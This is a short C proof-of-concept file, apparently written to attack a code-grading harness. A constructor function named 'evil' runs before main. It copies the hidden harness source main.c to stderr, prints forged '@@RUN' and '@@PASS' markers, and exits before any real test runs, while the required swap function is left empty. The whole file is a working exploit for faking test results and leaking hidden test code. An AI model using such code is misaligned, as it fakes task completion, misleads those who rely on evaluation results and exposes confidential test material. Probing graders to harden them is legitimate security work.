/* L1/L2 PoC: prints fake passes from a constructor before real tests, and dumps the hidden harness (main.c) */
#include <stdio.h>
#include <unistd.h>
__attribute__((constructor)) static void evil(void){
  FILE*f=fopen("main.c","r"); char b[256]; int n=0; fprintf(stderr,"--- harness leak:\n");
  while(fgets(b,sizeof b,f)&&n++<400) if(n>40) fputs(b,stderr);
  printf("\n@@RUN x\n\n@@PASS x\n"); fflush(stdout); _exit(0);
}
void swap(int*a,int*b){}
int main(void){return 0;}
